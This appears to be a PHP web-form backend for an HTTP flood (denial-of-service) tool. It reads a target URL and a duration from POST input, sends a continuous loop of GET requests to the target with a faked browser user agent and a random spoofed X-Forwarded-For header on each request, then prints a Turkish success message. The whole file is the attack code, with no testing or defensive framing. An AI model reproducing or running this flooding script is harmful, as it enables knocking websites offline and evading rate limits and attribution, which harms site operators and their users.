<html><body>success</body></html>
<?php
$targetUrlHttp = $_POST['targetUrlHttp']; 

$httpMethod = 'GET';

$requestCount = 10000; 

$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36';

$proxy = '';

$durationHttp =  $_POST['durationHttp']; 

$startTime = time();
$endTime = $startTime + $durationHttp; 

while (time() < $endTime) {
    $randomIP = rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255);
    
    $ch = curl_init($targetUrlHttp);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $httpMethod);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Forwarded-For: $randomIP"));
    
    curl_exec($ch);
    curl_close($ch);
    
}

echo "Belirtilen süre boyunca istekler başarıyla gönderildi.";
?>
